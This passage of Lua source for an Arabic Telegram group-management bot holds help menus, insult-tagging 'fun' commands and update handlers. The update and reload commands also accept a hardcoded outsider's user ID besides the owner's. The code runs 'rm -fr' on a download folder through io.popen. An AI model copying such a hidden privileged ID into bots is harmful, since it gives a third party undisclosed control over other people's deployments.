⌯ تفعيل ↣ ↢ تعطيل ردود المطور 
⌯ تفعيل ↣ ↢ تعطيل التنظيف التلقائي
⌯ تفعيل ↣ ↢ تعطيل البايو 
⌯ تفعيل ↣ ↢ الردود العشوائيه 

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="م2",callback_data="/HelpList2"..UserID},{text="م1",callback_data="/HelpList1"..UserID}},
{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}},
{{text="رجوع",callback_data="/HelpList"..UserID}}
} 
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if abbas == '/HelpListRrd'..UserID then
SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
Text = [[
* للاستفسار -* []]..SUDO_USER..[[]

*⦗ تفعيل التسليه ⦘*
*⦗ تعطيل التسليه ⦘*

🍰 ⌯ رفع ↣ ↢ تنزيل كيكه
🍯 ⌯ رفع ↣ ↢ تنزيل عسل
💩 ⌯ رفع ↣ ↢ تنزيل زق
🦓 ⌯ رفع ↣ ↢ تنزيل حمار
🐄 ⌯ رفع ↣ ↢ تنزيل بقره
🐩 ⌯ رفع ↣ ↢ تنزيل كلب
🐒 ⌯ رفع ↣ ↢ تنزيل قرد
🐐 ⌯ رفع ↣ ↢ تنزيل تيس
🐂 ⌯ رفع ↣ ↢ تنزيل ثور
🏅 ⌯ رفع ↣ ↢ تنزيل باعوص
🐓 ⌯ رفع ↣ ↢ تنزيل دجاجه
🧱 ⌯ رفع ↣ ↢ تنزيل هطف
🔫 ⌯ رفع ↣ ↢ تنزيل صياد
🐏 ⌯ رفع ↣ ↢ تنزيل خاروف
❤️ ⌯ رفع لقلبي ↣ ↢ تنزيل من قلبي
👫 ⌯ زواج ↣ ↢ طلاق

⌯ قائمة الكيك
⌯ قائمة العسل
⌯ قائمة الزق
⌯ قائمة الحمير
⌯ قائمة البقر
⌯ قائمة الكلاب
⌯ قائمة القرود
⌯ قائمة التيس
⌯ قائمة الثور
⌯ قائمة البواعيص
⌯ قائمة الدجاج
⌯ قائمة الهطوف
⌯ قائمة الصيادين
⌯ قائمة الخرفان
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="م2",callback_data="/HelpList2"..UserID},{text="م1",callback_data="/HelpList1"..UserID}},
{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="م3",callback_data="/HelpList3"..UserID}},
{{text="رجوع",callback_data="/HelpList"..UserID}}
} 
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if abbas == '/HelpListDev'..UserID then
SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
Text = [[
* للاستفسار -* []]..SUDO_USER..[[]

✶ اليـوتيوب
- امر التشغيل ❨ تفعيل اليوتيوب ❩
- امر التعطيل ❨ تعطيل اليوتيوب ❩

✶ البـحث عن اغنية ↓
↞ بحث اسم الاغنية


]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="م2",callback_data="/HelpList2"..UserID},{text="م1",callback_data="/HelpList1"..UserID}},
{{text="التسليه",callback_data="/HelpListRrd"..UserID},{text="م3",callback_data="/HelpList3"..UserID}},
{{text="رجوع",callback_data="/HelpList"..UserID}}
} 
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if abbas == '/HelpList'..UserID then
SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
Text = [[*⇜ اهلا بك في اوامر البوت

للاستفسار -* []]..SUDO_USER..[[]

]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="م1",callback_data="/HelpList1"..UserID},{text="م2",callback_data="/HelpList2"..UserID}},{{text="م3",callback_data="/HelpList3"..UserID}},{{text="الاغاني",callback_data="/HelpListDev"..UserID},{text="التسليه",callback_data="/HelpListRrd"..UserID}}} 
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatID..'&message_id='..IQ_ABS..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

------------------------------{ End }------------------------

elseif data.ID == "UpdateMessageSendSucceeded" then
local msg = data.message_
if msg.content_.text_ then
if redis:get(boss..":propin"..msg.chat_id_) == msg.content_.text_ then
redis:del(boss..":propin"..msg.chat_id_)
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) end,nil)   
end

end
if Refresh_Start then
Refresh_Start = false
Start_Bot()
return false
end 
if UpdateSourceStart then
UpdateSourceStart = false
UpdateSource(msg,true)
end
elseif data.ID == "UpdateNewMessage" then
if msg.content_.ID == "MessageText" then
if msg.content_.entities_ and msg.content_.entities_[0] and msg.content_.entities_[0].ID then
if msg.content_.entities_[0].ID == "MessageEntityTextUrl" then
msg.textEntityTypeTextUrl = true
print("MessageEntityTextUrl")
elseif msg.content_.entities_[0].ID == "MessageEntityBold" then 
msg.textEntityTypeBold = true
elseif msg.content_.entities_[0].ID == "MessageEntityItalic" then
msg.textEntityTypeItalic = true
print("MessageEntityItalic")
elseif msg.content_.entities_[0].ID == "MessageEntityCode" then
msg.textEntityTypeCode = true
print("MessageEntityCode")
end
end
msg.text = msg.content_.text_
if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486) then
return sendMsg(msg.chat_id_,msg.id_,"*تم*",function(arg,data)
Refresh_Start = true
end)
end

if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486) then
UpdateSource(msg)
sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
dofile("./inc/Run.lua")
print("Reload ~ ./inc/Run.lua")
end) 
end
if (msg.text == 'reload' or msg.text == "تحديث البوت") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486) then
sendMsg(msg.chat_id_,msg.id_,'*تم يروحي انت*',function(arg,data)
dofile("./inc/Run.lua")
print("Reload ~ ./inc/Run.lua")
end)
return false
end
end 
input_inFo(msg)

elseif data.ID == "UpdateNewChat" then  
if redis:get(boss..'group:add'..data.chat_.id_) then
redis:set(boss..'group:name'..data.chat_.id_,data.chat_.title_)
end
elseif data.ID == "UpdateChannel" then  
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
if redis:get(boss..'group:add-100'..data.channel_.id_) then
local linkGroup = (redis:get(boss..'linkGroup-100'..data.channel_.id_) or "")
local NameGroup = (redis:get(boss..'group:name-100'..data.channel_.id_) or "")
send_msg(SUDO_ID,"⇜ قام شخص بطرد البوت من المجموعه الاتيه : \n⇜ ألايدي : `-100"..data.channel_.id_.."`\n⇜ الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n⇜ تـم مسح كل بيانات المجموعه بنـجاح ")
rem_data_group('-100'..data.channel_.id_)
end
end
elseif data.ID == "UpdateFile" then 
if Uploaded_Groups_Ok then
Uploaded_Groups_Ok = false
local GetInfo = io.open(data.file_.path_, "r"):read('*a')
local All_Groups = JSON.decode(GetInfo)
for k,IDS in pairs(All_Groups.Groups) do
redis:mset(
boss..'group:name'..k,IDS.Title,
boss..'num_msg_max'..k,5,
boss..'group:add'..k,true,
boss..'lock_link'..k,true,
boss..'lock_spam'..k,true,
boss..'lock_webpage'..k,true,
boss..'lock_markdown'..k,true,
boss..'lock_flood'..k,true,
boss..'lock_bots'..k,true,
boss..'mute_forward'..k,true,
boss..'mute_contact'..k,true,
boss..'mute_document'..k,true,
boss..'mute_inline'..k,true,
boss..'lock_username'..k,true,
boss..'replay'..k,true
)
redis:sadd(boss..'group:ids',k) 

if IDS.Admins then
for user,ID in pairs(IDS.Admins) do
redis:hset(boss..'username:'..ID,'username',user)
redis:sadd(boss..'admins:'..k,ID)
end
end
if IDS.Creator then
for user,ID in pairs(IDS.Creator) do
redis:hset(boss..'username:'..ID,'username',user)
redis:sadd(boss..':MONSHA_BOT:'..k,ID)
end
end
if IDS.Owner then
for user,ID in pairs(IDS.Owner) do
redis:hset(boss..'username:'..ID,'username',user)
redis:sadd(boss..'owners:'..k,ID)
end
end
end
io.popen("rm -fr ../.telegram-cli/data/document/*")
sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'*⇜* تم رفع النسخة‏‏ الاحتياطيه\n*⇜* حاليا عدد مجموعاتك هي‏‏ *'..redis:scard(boss..'group:ids')..'* 🌿\n✓')
end
elseif data.ID == "UpdateUser" then  
if data.user_.type_.ID == "UserTypeDeleted" then
print("¦ userTypeDeleted")
redis:srem(boss..'users',data.user_.id_)
elseif data.user_.type_.ID == "UserTypeGeneral" then
local CheckUser = redis:hgetall(boss..'username:'..data.user_.id_).username
if data.user_.username_  then 
USERNAME = '@'..data.user_.username_
else
USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
end	
if CheckUser and CheckUser ~= USERNAME  then
print("¦ Enter Update User ")
redis:hset(boss..'username:'..data.user_.id_,'username',USERNAME)
end 
end
elseif data.ID == "UpdateMessageEdited" then
GetMsgInfo(data.chat_id_,data.message_id_,function(arg,data)
msg = data
msg.edited = true
msg.text = data.content_.text_
input_inFo(msg)  
end,nil)
elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
--UpdateSource() dofile("./inc/Run.lua")
tdcli_function({ID='GetChat',chat_id_ = SUDO_ID},function(arg,data)end,nil)
end


end
